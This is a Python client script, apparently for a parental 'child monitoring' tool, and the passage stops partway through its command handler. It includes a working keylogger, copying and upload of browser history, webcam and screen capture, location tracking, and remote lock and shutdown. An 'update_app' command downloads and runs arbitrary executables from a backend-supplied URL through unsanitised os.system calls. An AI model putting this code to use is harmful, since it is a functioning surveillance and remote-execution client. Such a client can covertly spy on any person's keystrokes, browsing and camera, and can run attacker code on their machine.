"""
CLIENT SCRIPT - Runs on child's computer and syncs with MongoDB
Registers device and executes commands from the backend
"""
import requests
import json
import time
import threading
import socket
import os
import platform
import psutil
import base64
import sqlite3
from io import BytesIO
from datetime import datetime, timedelta
import glob
import shutil
import tempfile
import imageio
import mss
import numpy as np
from pymongo import MongoClient
from pynput import keyboard
from dotenv import load_dotenv
import pyautogui
import cv2
import pygetwindow as gw
import winreg
import ctypes

# Load environment variables from .env file
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '.env'))

# ==================== ADMIN PRIVILEGE MANAGEMENT ====================

def is_admin():
    """Check if script is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def request_admin_privileges():
    """Request admin privileges using UAC (Windows only)"""
    if is_admin():
        print(" Already running with admin privileges")
        return True
    
    try:
        print("\n" + "="*60)
        print("️ ADMIN PRIVILEGES REQUIRED")
        print("="*60)
        print("The following features require admin privileges:")
        print("  • Website blocking/unblocking (hosts file)")
        print("  • Process killing (app blocking)")
        print("  • System commands (lock, shutdown, restart)")
        print("\nOptions:")
        print("  1. Right-click client.py → Run as Administrator")
        print("  2. Run command: python -m run_client_as_admin.bat")
        print("  3. Or execute: run_client_as_admin.bat")
        print("="*60 + "\n")
        return False
    except Exception as e:
        print(f"Error checking admin: {e}")
        return False

def check_admin_for_operation(operation):
    """Check admin privileges for specific operations"""
    if operation in ["block_website", "unblock_website", "block_exe", "unblock_exe", "kill_process"]:
        if not is_admin():
            print(f"WARNING: {operation} requires admin privileges!")
            print("   Some functionality may be limited")
            return False
    return True

# Configuration - FROM ENVIRONMENT VARIABLES (SECURE)
BACKEND_URL = os.getenv('BACKEND_URL', 'http://localhost:5000')
MONGO_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
DB_NAME = os.getenv('DB_NAME', 'child_monitoring')
DEVICE_ID = socket.gethostname()
DEVICE_NAME = f"{platform.node()} - {platform.system()}"

# MongoDB Connection
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
keystrokes_col = db["keystrokes"]

# Global variables
keylogger_running = False
captured_text = ""
listener = None
browser_usage_buffer = {}
browser_usage_lock = threading.Lock()
BROWSER_KEYWORDS = {
    "chrome": "Chrome",
    "edge": "Edge",
    "firefox": "Firefox"
}
app_usage_buffer = {}
app_usage_lock = threading.Lock()

# ==================== KEYSTROKE LOGGING ====================

def on_press(key):
    """Capture keystrokes in readable English format"""
    global captured_text, keylogger_running
    
    if not keylogger_running:
        return False
    
    try:
        # Handle regular printable characters
        if hasattr(key, 'char') and key.char and key.char.isprintable():
            captured_text += key.char
            print(f"Key: {key.char}")
        # Handle special keys in readable format
        else:
            if key == keyboard.Key.space:
                captured_text += " "
            elif key == keyboard.Key.enter:
                captured_text += " [ENTER] "  # Show Enter was pressed
                send_keystrokes()
            elif key == keyboard.Key.backspace:
                if captured_text:
                    captured_text = captured_text[:-1]
            elif key == keyboard.Key.tab:
                captured_text += " [TAB] "
            # Ignore other special keys (shift, ctrl, alt, etc.) for cleaner output
        
        # Auto-send if buffer gets too large (500 chars)
        if len(captured_text) > 500:
            send_keystrokes()
            
    except AttributeError:
        pass

def send_keystrokes():
    """Send keystrokes to backend"""
    global captured_text
    
    if captured_text and captured_text.strip():  # Only send if there's actual content
        try:
            keystroke_doc = {
                "device_id": DEVICE_ID,
                "text": captured_text.strip(),
                "created_at": datetime.now()
            }
            keystrokes_col.insert_one(keystroke_doc)
            print(f"Sent keystrokes: {captured_text[:50]}...")  # Show preview
            captured_text = ""
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def auto_save_keystrokes():
    """Automatically save keystrokes every 30 seconds"""
    while keylogger_running:
        time.sleep(30)  # Save every 30 seconds
        if captured_text and len(captured_text) > 0:
            send_keystrokes()

def start_keylogger():
    """Start keystroke listener with auto-save"""
    global keylogger_running, listener
    
    if keylogger_running:
        return
    
    keylogger_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Start auto-save thread
    autosave_thread = threading.Thread(target=auto_save_keystrokes, daemon=True)
    autosave_thread.start()
    
print("Keystroke monitoring started (auto-saves every 30 seconds)")

def stop_keylogger():
    """Stop keystroke listener"""
    global keylogger_running, listener
    
    keylogger_running = False
    if listener:
        listener.stop()
        listener = None
    print("Keylogger stopped")

# ==================== WEBSITE BLOCKING ====================

def block_websites(websites):
    """Block websites by modifying hosts file"""
    try:
        if not websites or len(websites) == 0:
            print(f"No websites provided to block")
            return {"success": False, "message": "No websites provided"}
        
        print(f"Attempting to block websites: {', '.join(websites)}")
        hosts_path = r"C:\Windows\System32\drivers\etc"
        hosts_file = os.path.join(hosts_path, "hosts")
        redirect_ip = "127.0.0.1"
        
        # Check if path exists
        if not os.path.exists(hosts_path):
            print(f"Hosts file directory not found: {hosts_path}")
            return {"success": False, "message": "Hosts file directory not found"}
        
        # Read current hosts file
        try:
            with open(hosts_file, 'r') as file:
                hosts_content = file.read()
        except FileNotFoundError:
            print(f"Hosts file not found, will create entries")
            hosts_content = ""
        except PermissionError:
            print(" ERROR: Administrator privileges required to read hosts file!")
            print("️ Right-click client.py and select 'Run as administrator'")
            print("️ Or run: run_client_as_admin.bat")
            return {"success": False, "message": "Admin privileges required"}
        
        # Add blocked websites
        new_entries = []
        blocked_count = 0
        for website in websites:
            if not website or website.strip() == '':
                continue
            
            # Remove http://, https://, and www prefix if present
            clean_website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0].strip()
            
            if clean_website and clean_website not in hosts_content:
                new_entries.append(f"\n{redirect_ip} {clean_website}")
                new_entries.append(f"\n{redirect_ip} www.{clean_website}")
                blocked_count += 1
                print(f"   Will block: {clean_website} and www.{clean_website}")
            else:
                print(f"   Already blocked: {clean_website}")
        
        if new_entries:
            try:
                with open(hosts_file, 'a') as file:
                    file.writelines(new_entries)
                print(f"Successfully blocked {blocked_count} website(s)")
                return {"success": True, "message": f"Blocked {blocked_count} website(s)"}
            except PermissionError:
                print("ERROR: Administrator privileges required to modify hosts file!")
                print("Right-click client.py and select 'Run as administrator'")
                print("Or run: run_client_as_admin.bat")
                return {"success": False, "message": "Admin privileges required"}
        else:
            print(f"All websites already blocked")
            return {"success": True, "message": "Websites already blocked"}
            
    except Exception as e:
        print(f"Error blocking websites: {e}")
        import traceback
        traceback.print_exc()
        return {"success": False, "message": str(e)}

def unblock_websites(websites):
    """Unblock websites by removing from hosts file"""
    try:
        if not websites or len(websites) == 0:
            print(f"No websites provided to unblock")
            return {"success": False, "message": "No websites provided"}
        
        print(f"Attempting to unblock websites: {', '.join(websites)}")
        hosts_path = r"C:\Windows\System32\drivers\etc"
        hosts_file = os.path.join(hosts_path, "hosts")
        
        # Check if path exists
        if not os.path.exists(hosts_file):
            print(f"Hosts file not found: {hosts_file}")
            return {"success": True, "message": "Websites were not blocked"}
        
        # Read hosts file
        try:
            with open(hosts_file, 'r') as file:
                lines = file.readlines()
        except PermissionError:
            print(" ERROR: Administrator privileges required to read hosts file!")
            print("️ Right-click client.py and select 'Run as administrator'")
            print("️ Or run: run_client_as_admin.bat")
            return {"success": False, "message": "Admin privileges required"}
        
        # Filter out blocked websites
        filtered_lines = []
        removed_count = 0
        for line in lines:
            should_keep = True
            for website in websites:
                if not website or website.strip() == '':
                    continue
                # Clean website name
                clean_website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0].strip()
                if clean_website and clean_website in line and '127.0.0.1' in line:
                    should_keep = False
                    removed_count += 1
                    print(f"   Removing entry: {line.strip()}")
                    break
            if should_keep:
                filtered_lines.append(line)
        
        # Write back
        try:
            with open(hosts_file, 'w') as file:
                file.writelines(filtered_lines)
        except PermissionError:
            print(" ERROR: Administrator privileges required to modify hosts file!")
            print("️ Right-click client.py and select 'Run as administrator'")
            print("️ Or run: run_client_as_admin.bat")
            return {"success": False, "message": "Admin privileges required"}
        
        if removed_count > 0:
            print(f"Successfully unblocked: {', '.join(websites)} ({removed_count} entries removed)")
            return {"success": True, "message": f"Unblocked {removed_count} entry/entries"}
        else:
            print(f"Websites were not blocked")
            return {"success": True, "message": "Websites were not blocked"}
            
    except Exception as e:
        print(f"Error unblocking websites: {e}")
        import traceback
        traceback.print_exc()
        return {"success": False, "message": str(e)}

# ==================== EXE BLOCKING ====================

blocked_exes = []
exe_monitor_running = False
exe_kill_attempts = {}  # Track kill attempts per process

def block_exe(exe_name):
    """Block execution of specific programs"""
    global blocked_exes, exe_monitor_running
    try:
        # Clean exe name (remove .exe if present, lowercase)
        exe_name = exe_name.lower().replace('.exe', '')
        
        if not exe_name or exe_name.strip() == '':
            print(f" Invalid executable name")
            return False
        
        if exe_name not in blocked_exes:
            blocked_exes.append(exe_name)
            print(f"Added to block list: {exe_name}")
            print(f"   Blocked apps: {', '.join(blocked_exes)}")
        else:
            print(f"{exe_name} already in block list")
        
        # Start monitoring thread if not already running
        if not exe_monitor_running:
            exe_monitor_running = True
            monitor_thread = threading.Thread(target=monitor_blocked_exes, daemon=True, name='exe_monitor')
            monitor_thread.start()
            print("EXE monitor started (checking every 2 seconds)")
        
        # Immediately kill any running instances
        kill_blocked_processes()
        return True  # Return success
        
    except Exception as e:
        print(f"Error blocking exe: {e}")
        import traceback
        traceback.print_exc()
        return False  # Return failure

def unblock_exe(exe_name):
    """Remove application from block list"""
    global blocked_exes, exe_monitor_running
    try:
        exe_name = exe_name.lower().replace('.exe', '')
        
        if not exe_name or exe_name.strip() == '':
            print(f" Invalid executable name")
            return False
        
        if exe_name in blocked_exes:
            blocked_exes.remove(exe_name)
            print(f"Removed from block list: {exe_name}")
            print(f"   Remaining blocked apps: {', '.join(blocked_exes) if blocked_exes else 'None'}")
            
            # Stop monitor if no more blocked apps
            if len(blocked_exes) == 0:
                exe_monitor_running = False
                print("ℹ️ No more blocked apps, monitor stopping")
        else:
            print(f"{exe_name} was not in block list")
            print(f"   Current blocked apps: {', '.join(blocked_exes) if blocked_exes else 'None'}")
        
        return True  # Return success
            
    except Exception as e:
        print(f"Error unblocking exe: {e}")
        import traceback
        traceback.print_exc()
        return False  # Return failure

def kill_blocked_processes():
    """Kill all currently running blocked processes"""
    try:
        killed = []
        access_denied = []
        
        if not blocked_exes:
            return  # No blocked apps to kill
        
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                proc_name = proc.info['name'].lower().replace('.exe', '')
                proc_pid = proc.info['pid']
                
                for blocked in blocked_exes:
                    if blocked in proc_name:
                        try:
                            proc.kill()
                            killed.append(proc.info['name'])
                            exe_kill_attempts[proc_pid] = exe_kill_attempts.get(proc_pid, 0) + 1
                            print(f"Killed: {proc.info['name']} (PID: {proc_pid})")
                        except psutil.AccessDenied:
                            access_denied.append(f"{proc.info['name']} (PID: {proc_pid})")
                            print(f"Access denied killing: {proc.info['name']} (PID: {proc_pid}) - admin privileges may be needed")
                        break
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        if killed:
            print(f"Terminated {len(killed)} blocked process(es)")
        if access_denied:
            print(f"Could not kill {len(access_denied)} process(es) - admin needed")
    except Exception as e:
        print(f"Error killing processes: {e}")

def monitor_blocked_exes():
    """Continuously monitor and kill blocked processes"""
    global exe_monitor_running
    print(f" EXE monitoring active - blocked apps: {', '.join(blocked_exes)}")
    monitor_failures = 0
    
    while exe_monitor_running and len(blocked_exes) > 0:
        try:
            kill_blocked_processes()
            monitor_failures = 0  # Reset on success
            time.sleep(2)  # Check every 2 seconds
        except Exception as e:
            monitor_failures += 1
            print(f"Monitor error (attempt {monitor_failures}): {e}")
            if monitor_failures > 5:
                print(f" Monitor failed too many times, stopping")
                exe_monitor_running = False
                break
            time.sleep(5)

# ==================== LOCATION TRACKING ====================

def get_location():
    """Get device location using IP-based geolocation (simplified and reliable)"""
    try:
        print(" Getting location...")
        
        # Get public IP
        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
            ip_address = ip_response.json().get('ip', 'Unknown')
            print(f" IP Address: {ip_address}")
        except Exception as e:
            print(f"Could not get IP: {e}")
            ip_address = "Unknown"
        
        # Try ip-api.com (free, no key needed, reliable)
        try:
            location_response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=10)
            location_data = location_response.json()
            
            if location_data.get('status') == 'success':
                location = {
                    "method": "IP-based",
                    "ip": ip_address,
                    "country": location_data.get('country', 'Unknown'),
                    "region": location_data.get('regionName', 'Unknown'),
                    "city": location_data.get('city', 'Unknown'),
                    "zip": location_data.get('zip', 'Unknown'),
                    "lat": location_data.get('lat', 0),
                    "lon": location_data.get('lon', 0),
                    "isp": location_data.get('isp', 'Unknown'),
                    "timezone": location_data.get('timezone', 'Unknown'),
                    "timestamp": datetime.now().isoformat()
                }
                print(f" Location: {location['city']}, {location['region']}, {location['country']}")
                return location
            else:
                print(f"IP API error: {location_data.get('message', 'Unknown error')}")
                return {"error": "Could not determine location", "ip": ip_address}
        except Exception as e:
            print(f" Error getting location: {e}")
            return {"error": str(e), "ip": ip_address}
            
    except Exception as e:
        print(f" Location error: {e}")
        return {"error": str(e)}



def send_result(command_id, result):
    """Send command result to backend"""
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/command/result/{command_id}",
            json={"result": result},
            timeout=5
        )
        if response.status_code == 200:
            print(f" Result sent successfully for command {command_id}")
        else:
            print(f"️ Result send got status {response.status_code}: {response.text}")
    except Exception as e:
        print(f" Error sending result: {e}")

def send_location_to_backend(location):
    """Send location to backend via API (new endpoint)"""
    try:
        if location and "lat" in location and "lon" in location:
            payload = {
                "device_id": DEVICE_ID,
                "latitude": location.get("lat", 0),
                "longitude": location.get("lon", 0),
                "accuracy": location.get("accuracy", 0)
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-location",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(" Location sent to backend")
                return True
    except Exception as e:
        print(f"Error sending location: {e}")
    return False

def send_browser_history_to_backend(history):
    """Send browser history to backend via API"""
    try:
        if history:
            payload = {
                "device_id": DEVICE_ID,
                "history": history
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-browser-history",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(f" Browser history sent to backend ({len(history)} entries)")
                return True
    except Exception as e:
        print(f"Error sending browser history: {e}")
    return False

def send_browser_usage_to_backend(usage):
    """Send browser usage time to backend via API"""
    try:
        if usage:
            payload = {
                "device_id": DEVICE_ID,
                "usage": usage
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-browser-usage",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(f" Browser usage sent to backend ({len(usage)} entries)")
                return True
    except Exception as e:
        print(f"Error sending browser usage: {e}")
    return False

def send_app_usage_to_backend(usage):
    """Send app usage data to backend via API"""
    try:
        if usage:
            payload = {
                "device_id": DEVICE_ID,
                "usage": usage
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-app-usage",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(f" App usage sent to backend ({len(usage)} apps)")
                return True
    except Exception as e:
        print(f"Error sending app usage: {e}")
    return False

def _webkit_time_to_datetime(value):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=int(value))
    except Exception:
        return None

def _epoch_micro_to_datetime(value):
    try:
        return datetime.utcfromtimestamp(int(value) / 1_000_000)
    except Exception:
        return None

def _get_chromium_history(history_path, browser_name, limit=50):
    if not os.path.exists(history_path):
        return []
    temp_db = f"temp_{browser_name.lower()}_history.db"
    try:
        shutil.copy2(history_path, temp_db)
    except Exception as e:
        print(f"Error copying {browser_name} history: {e}")
        return []

    rows = []
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?",
            (limit,)
        )
        rows = cursor.fetchall()
    except sqlite3.Error as e:
        print(f"Error reading {browser_name} history: {e}")
    finally:
        try:
            if conn:
                conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)
        except Exception:
            pass

    results = []
    for url, title, last_visit_time in rows:
        visited_at = _webkit_time_to_datetime(last_visit_time)
        results.append({
            "url": url,
            "title": title,
            "visited_at": visited_at.isoformat() if visited_at else None,
            "browser": browser_name
        })
    return results

def _get_firefox_history(limit=50):
    results = []
    profiles_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*")
    for profile in glob.glob(profiles_path):
        history_path = os.path.join(profile, "places.sqlite")
        if not os.path.exists(history_path):
            continue
        temp_db = "temp_firefox_history.db"
        try:
            os.system(f'copy "{history_path}" "{temp_db}"')
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT p.url, p.title, v.visit_date
                FROM moz_places p
                JOIN moz_historyvisits v ON v.place_id = p.id
                ORDER BY v.visit_date DESC
                LIMIT ?
                """,
                (limit,)
            )
            rows = cursor.fetchall()
            conn.close()
            os.remove(temp_db)
            for url, title, visit_date in rows:
                visited_at = _epoch_micro_to_datetime(visit_date)
                results.append({
                    "url": url,
                    "title": title,
                    "visited_at": visited_at.isoformat() if visited_at else None,
                    "browser": "Firefox"
                })
        except Exception as e:
            print(f"Error reading Firefox history: {e}")
            try:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            except Exception:
                pass
    return results

def get_all_browser_history():
    history = []
    chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
    edge_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
    history.extend(_get_chromium_history(chrome_path, "Chrome"))
    history.extend(_get_chromium_history(edge_path, "Edge"))
    history.extend(_get_firefox_history())
    return history

def _get_active_browser():
    try:
        window = gw.getActiveWindow()
        title = window.title if window else ""
        if not title:
            return None, ""
        title_lower = title.lower()
        for key, label in BROWSER_KEYWORDS.items():
            if key in title_lower:
                return label, title
        return None, title
    except Exception:
        return None, ""

def track_browser_usage():
    """Track active browser window time and send periodically"""
    sample_interval = 10
    flush_interval = 300
    elapsed = 0
    while keylogger_running:
        browser, title = _get_active_browser()
        if browser:
            with browser_usage_lock:
                entry = browser_usage_buffer.get(browser, {"duration": 0, "window_title": ""})
                entry["duration"] += sample_interval
                entry["window_title"] = title
                browser_usage_buffer[browser] = entry
        time.sleep(sample_interval)
        elapsed += sample_interval
        if elapsed >= flush_interval:
            with browser_usage_lock:
                usage_payload = [
                    {"browser": name, "duration": data["duration"], "window_title": data["window_title"]}
                    for name, data in browser_usage_buffer.items()
                    if data.get("duration", 0) > 0
                ]
                browser_usage_buffer.clear()
            if usage_payload:
                send_browser_usage_to_backend(usage_payload)
            elapsed = 0

def _get_active_app_title():
    try:
        window = gw.getActiveWindow()
        title = window.title if window else ""
        if not title:
            return "Unknown"
        for key in BROWSER_KEYWORDS.keys():
            if key in title.lower():
                return None
        if " - " in title:
            return title.split(" - ")[0].strip() or title
        return title
    except Exception:
        return "Unknown"

# ==================== DEVICE REGISTRATION ====================

def register_device():
    """Register device with backend"""
    try:
        data = {
            "device_id": DEVICE_ID,
            "device_name": DEVICE_NAME
        }
        response = requests.post(f"{BACKEND_URL}/api/register-device", json=data, timeout=5)
        if response.status_code == 200:
            print(f"Device registered: {response.json()}")
            return True
        else:
            print(f"Registration failed: {response.text}")
            return False
    except Exception as e:
        print(f"Error registering device: {e}")
        return False

def request_claim_code():
    """Request a claim code for this device"""
    try:
        payload = {
            "device_id": DEVICE_ID,
            "device_name": DEVICE_NAME
        }
        response = requests.post(f"{BACKEND_URL}/api/device/claim-code", json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            code = data.get("claim_code")
            if code:
                print("\n" + "=" * 60)
                print(" DEVICE CLAIM CODE")
                print(f"Code: {code}")
                print("Parent: login to dashboard and enter this code to claim this device")
                print("=" * 60 + "\n")
                return code
        else:
            print(f"Claim code request failed: {response.text}")
    except Exception as e:
        print(f"Error requesting claim code: {e}")
    return None

# ==================== COMMAND EXECUTION ====================

def check_pending_commands():
    """Check for pending commands from backend"""
    try:
        response = requests.get(
            f"{BACKEND_URL}/api/commands/pending/{DEVICE_ID}",
            timeout=5
        )
        if response.status_code == 200:
            commands = response.json()
            if commands:  # Only print if there are commands
                print(f"\n {len(commands)} pending command(s) found")
                # Log popup_alert commands specifically
                for cmd in commands:
                    cmd_type = cmd.get('command')
                    if cmd_type == 'popup_alert':
                        print(f"  ️ POPUP_ALERT COMMAND FOUND: {cmd.get('_id')}")
                        print(f"     Title: {cmd.get('params', {}).get('title')}")
                        print(f"     Message: {cmd.get('params', {}).get('message')}")
                        print(f"     Voice: {cmd.get('params', {}).get('voice')}")
            for cmd in commands:
                execute_command(cmd)
    except requests.exceptions.RequestException as e:
        # Silently fail - don't spam console with connection errors
        pass
    except Exception as e:
        print(f"Error checking commands: {e}")

def _record_screen(duration, fps=10):
    """Capture a short screen recording and return base64 video data."""
    frames = []
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        start_time = time.time()
        frame_delay = 1 / fps
        while time.time() - start_time < duration:
            frame = np.array(sct.grab(monitor))
            frames.append(frame)
            time.sleep(frame_delay)

    if not frames:
        raise RuntimeError("No frames captured")

    temp_path = os.path.join(tempfile.gettempdir(), f"parenteye_record_{int(time.time())}.mp4")
    imageio.mimsave(temp_path, frames, fps=fps)

    with open(temp_path, "rb") as f:
        video_b64 = base64.b64encode(f.read()).decode("utf-8")

    try:
        os.remove(temp_path)
    except Exception:
        pass

    return video_b64

def execute_command(cmd):
    """Execute command received from backend"""
    command_type = cmd.get('command')
    command_id = cmd.get('_id')
    params = cmd.get('params', {})
    
    print(f"\n{'='*50}")
    print(f" Executing command: {command_type}")
    print(f"{'='*50}")
    
    try:
        if command_type == "lock":
            print(" Locking workstation...")
            os.system("rundll32.exe user32.dll,LockWorkStation")
            send_result(command_id, {"type": "lock", "success": True, "message": "Workstation locked"})
        
        elif command_type == "shutdown":
            print(" Shutting down in 10 seconds...")
            os.system("shutdown /s /t 10")
            send_result(command_id, {"type": "shutdown", "success": True, "message": "Shutdown initiated"})
        
        elif command_type == "restart":
            print(" Restarting in 10 seconds...")
            os.system("shutdown /r /t 10")
            send_result(command_id, {"type": "restart", "success": True, "message": "Restart initiated"})
        
        elif command_type == "logout":
            print(" Logging out...")
            os.system("shutdown -l")
            send_result(command_id, {"type": "logout", "success": True, "message": "Logout initiated"})
        
        elif command_type == "keystrokes_start":
            start_keylogger()
            send_result(command_id, {"type": "keystrokes_start", "success": True, "message": "Keystroke monitoring started"})
        
        elif command_type == "keystrokes_stop":
            stop_keylogger()
            send_result(command_id, {"type": "keystrokes_stop", "success": True, "message": "Keystroke monitoring stopped"})
        
        # New unified blocking commands (block_site instead of block_website)
        elif command_type == "block_site":
            site = params.get('site', 'unknown.com')
            print(f" Blocking website: {site}")
            
            if not is_admin():
                print(f"️ WARNING: Website blocking requires admin privileges")
                print(f"   Hosts file modification may fail without admin")
            
            result = block_websites([site])
            success = result.get('success', False)
            message = result.get('message', 'Block operation completed')
            send_result(command_id, {
                "type": "block_site",
                "success": success,
                "admin_required": True,
                "ran_as_admin": is_admin(),
                "message": message
            })
        
        elif command_type == "unblock_site":
            site = params.get('site', 'unknown.com')
            print(f" Unblocking website: {site}")
            
            if not is_admin():
                print(f"️ WARNING: Website unblocking requires admin privileges")
                print(f"   Hosts file modification may fail without admin")
            
            result = unblock_websites([site])
            success = result.get('success', False)
            message = result.get('message', 'Unblock operation completed')
            send_result(command_id, {
                "type": "unblock_site",
                "success": success,
                "admin_required": True,
                "ran_as_admin": is_admin(),
                "message": message
            })
        
        # Old style commands for backward compatibility
        elif command_type == "block_website":
            websites = params.get('websites', [])
            print(f"Websites to block: {websites}")
            result = block_websites(websites)
            send_result(command_id, {"type": "block_website", **result})
        
        elif command_type == "unblock_website":
            websites = params.get('websites', [])
            print(f"Websites to unblock: {websites}")
            result = unblock_websites(websites)
            send_result(command_id, {"type": "unblock_website", **result})
        
        elif command_type == "Sync Website Blocking":
            print(" Syncing website blocking policies...")
            fetch_and_apply_blocked_websites()
            send_result(command_id, {"type": "sync_blocking", "success": True, "message": "Blocking policies synced. Please restart your browsers."})
        
        # New unified app blocking commands (block_app instead of block_exe)
        elif command_type == "block_app":
            app_name = params.get('app_name', 'unknown.exe')
            print(f" Blocking application: {app_name}")
            
            if not is_admin():
                print(f"️ WARNING: Blocking requires admin privileges")
                print(f"   Process termination may fail without admin")
            
            success = block_exe(app_name)
            send_result(command_id, {
                "type": "block_app",
                "success": success,
                "admin_required": True,
                "ran_as_admin": is_admin(),
                "message": f"Blocked {app_name}" if success else f"Failed to block {app_name}"
            })
        
        elif command_type == "unblock_app":
            app_name = params.get('app_name', 'unknown.exe')
            print(f" Unblocking application: {app_name}")
            success = unblock_exe(app_name)
            send_result(command_id, {
                "type": "unblock_app",
                "success": success,
                "message": f"Unblocked {app_name}" if success else f"Failed to unblock {app_name}"
            })
        
        # Old style commands for backward compatibility
        elif command_type == "block_exe":
            exe_name = params.get('exe_name', '')
            print(f"Application to block: {exe_name}")
            block_exe(exe_name)
            send_result(command_id, {"type": "block_exe", "success": True, "message": f"Blocked {exe_name}"})
        
        elif command_type == "unblock_exe":
            exe_name = params.get('exe_name', '')
            print(f"Application to unblock: {exe_name}")
            unblock_exe(exe_name)
            send_result(command_id, {"type": "unblock_exe", "success": True, "message": f"Unblocked {exe_name}"})
        
        elif command_type == "update_app":
            """Update application/exe from backend"""
            app_name = params.get('app_name', 'unknown.exe')
            download_url = params.get('download_url', '')
            version = params.get('version', '1.0')
            auto_restart = params.get('auto_restart', False)
            
            print(f"\n{'='*60}")
            print(f" APP UPDATE COMMAND RECEIVED")
            print(f"{'='*60}")
            print(f"App: {app_name}")
            print(f"Version: {version}")
            print(f"Download URL: {download_url}")
            print(f"Auto-restart: {auto_restart}")
            print(f"{'='*60}\n")
            
            try:
                if not download_url:
                    raise ValueError("No download URL provided")
                
                # Create apps directory if needed
                apps_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "apps")
                if not os.path.exists(apps_dir):
                    os.makedirs(apps_dir)
                    print(f" Created apps directory: {apps_dir}")
                
                app_path = os.path.join(apps_dir, app_name)
                backup_path = app_path + ".backup"
                
                # Create backup of current version
                if os.path.exists(app_path):
                    if os.path.exists(backup_path):
                        os.remove(backup_path)
                    shutil.copy2(app_path, backup_path)
                    print(f" Backup created: {backup_path}")
                
                # Download new version
                print(f"⬇️ Downloading from: {download_url}")
                response = requests.get(download_url, timeout=30)
                if response.status_code != 200:
                    raise Exception(f"Download failed: HTTP {response.status_code}")
                
                # Write new version
                with open(app_path, 'wb') as f:
                    f.write(response.content)
                file_size_kb = len(response.content) / 1024
                print(f" Downloaded: {file_size_kb:.2f} KB")
                print(f" Installed to: {app_path}")
                
                # If blocking this app, kill old instances
                if app_name.lower().replace('.exe', '') in blocked_exes:
                    print(f"️ Killing blocked app instances before update...")
                    kill_blocked_processes()
                
                result_msg = f"Updated {app_name} to version {version}"
                print(f" {result_msg}")
                
                # Auto-restart if requested
                if auto_restart:
                    print(f" Auto-restart enabled, restarting in 5 seconds...")
                    print(f"   Starting: {app_path}")
                    os.system(f"start \"\" \"{app_path}\"")
                    import time as time_mod
                    time_mod.sleep(5)
                
                send_result(command_id, {
                    "type": "update_app",
                    "success": True,
                    "app_name": app_name,
                    "version": version,
                    "message": result_msg,
                    "installed_path": app_path,
                    "restarted": auto_restart
                })
                
            except Exception as e:
                print(f" Update failed: {e}")
                
                # Attempt rollback if backup exists
                if os.path.exists(backup_path):
                    try:
                        print(f"️ Rolling back to backup...")
                        if os.path.exists(app_path):
                            os.remove(app_path)
                        shutil.copy2(backup_path, app_path)
                        print(f" Rollback successful: {app_path}")
                        rollback_success = True
                    except Exception as rb_err:
                        print(f" Rollback failed: {rb_err}")
                        rollback_success = False
                else:
                    rollback_success = False
                
                send_result(command_id, {
                    "type": "update_app",
                    "success": False,
                    "app_name": app_name,
                    "message": str(e),
                    "rollback_performed": rollback_success
                })
        
        elif command_type == "screenshot":
            print(" Capturing FRESH screenshot directly from device...")
            try:
                # Capture screenshot in REAL-TIME from device (not from database)
                capture_time = datetime.now().isoformat()
                screenshot = pyautogui.screenshot()
                img_byte_arr = BytesIO()
                screenshot.save(img_byte_arr, format='PNG')
                img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
                file_size_mb = len(img_base64) / (1024 * 1024)
                print(f" Fresh screenshot captured from device at {capture_time}")
                print(f"   Size: {file_size_mb:.2f} MB (base64 encoded)")
                
                # Send result with timestamp to confirm freshness
                send_result(command_id, {
                    "type": "screenshot",
                    "image_base64": img_base64,
                    "captured_at": capture_time,
                    "source": "device_realtime",
                    "device_id": DEVICE_ID
                })
                print(" Fresh screenshot result sent to backend")
            except Exception as e:
                print(f" Screenshot failed: {e}")
                send_result(command_id, {
                    "type": "screenshot",
                    "success": False,
                    "message": str(e),
                    "source": "device_realtime"
                })
        
        elif command_type == "webcam":
            print(" Capturing webcam...")
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    _, img_encoded = cv2.imencode('.jpg', frame)
                    img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
                    print(f" Webcam captured ({len(img_base64)} bytes base64)")
                    send_result(command_id, {"type": "webcam", "image_base64": img_base64})
                    print(" Webcam result sent to backend")
                else:
                    print(" Webcam: Failed to read frame from camera")
                    send_result(command_id, {"type": "webcam", "success": False, "message": "Unable to capture webcam"})
            except Exception as e:
                print(f" Webcam exception: {e}")
                send_result(command_id, {"type": "webcam", "success": False, "message": str(e)})

        elif command_type == "record":
            duration = int(params.get("duration", 10))
            print(f" Recording screen for {duration}s...")
            try:
                video_b64 = _record_screen(duration)
